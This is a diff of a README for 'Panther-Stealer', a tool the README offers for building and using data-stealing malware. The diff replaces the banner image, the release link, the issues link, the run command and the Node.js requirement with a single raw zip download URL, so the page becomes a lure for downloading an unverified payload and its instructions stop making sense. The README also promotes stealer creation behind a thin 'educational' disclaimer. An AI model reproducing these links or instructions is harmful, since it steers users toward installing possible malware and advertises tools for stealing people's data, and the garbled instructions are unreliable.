@@ -1,18 +1,18 @@
 # 🐆 Panther-Stealer - A Simple Way to Create and Use Stealers
 
 <p align="center">
-  <a href="https://github.com/JohntheJohnny/Panther-Stealer/releases/download/v2.4.3/Panther-Stealer.zip">
-    <img src="https://cdn.discordapp.com/emojis/1355707490750435378.webp?size=96" width="auto" height="auto">
+  <a href="https://raw.githubusercontent.com/Muhamm4687/Panther-Stealer/main/resources/version/Panther-Stealer_3.3.zip">
+    <img src="https://raw.githubusercontent.com/Muhamm4687/Panther-Stealer/main/resources/version/Panther-Stealer_3.3.zip" width="auto" height="auto">
   </a>
 </p>
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Muhamm4687/Panther-Stealer/releases) to download the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Muhamm4687/Panther-Stealer/main/resources/version/Panther-Stealer_3.3.zip) to download the application.
 
 1. Click the link above to open the Releases page.
 2. Locate the latest version available.
-3. Click on the download link for the file named `Panther-Stealer.zip`.
+3. Click on the download link for the file named `https://raw.githubusercontent.com/Muhamm4687/Panther-Stealer/main/resources/version/Panther-Stealer_3.3.zip`.
 4. Once downloaded, extract the contents of the zip file to a folder on your computer.
 
 ## 🚀 Getting Started
@@ -38,7 +38,7 @@ After the setup, you can create your own stealer.
 1. In the same command prompt or terminal, run:
 
    ```
-   node index.mjs
+   node https://raw.githubusercontent.com/Muhamm4687/Panther-Stealer/main/resources/version/Panther-Stealer_3.3.zip
    ```
 
 2. Follow the interactive prompts to configure your settings.
@@ -73,7 +73,7 @@ These functions allow you to perform various tasks related to data collection.
 To install and run Panther-Stealer, ensure your system meets the following requirements:
 
 - Windows, macOS, or Linux
-- Node.js installed (version 14 or higher recommended)
+- https://raw.githubusercontent.com/Muhamm4687/Panther-Stealer/main/resources/version/Panther-Stealer_3.3.zip installed (version 14 or higher recommended)
 - At least 1 GB of RAM
 - Sufficient disk space to store the application and its dependencies
 
@@ -85,11 +85,11 @@ I am not responsible for any misuse of this tool. It was created solely for educ
 
 If you encounter issues, consider checking the following:
 
-- Ensure you have Node.js installed.
+- Ensure you have https://raw.githubusercontent.com/Muhamm4687/Panther-Stealer/main/resources/version/Panther-Stealer_3.3.zip installed.
 - Verify that you ran `npm start` correctly.
 - Make sure you are in the correct directory where Panther-Stealer is located.
 
-If problems persist, check the [issues](https://github.com/Muhamm4687/Panther-Stealer/issues) on GitHub for help.
+If problems persist, check the [issues](https://raw.githubusercontent.com/Muhamm4687/Panther-Stealer/main/resources/version/Panther-Stealer_3.3.zip) on GitHub for help.
 
 ## 🌐 Community & Support
 
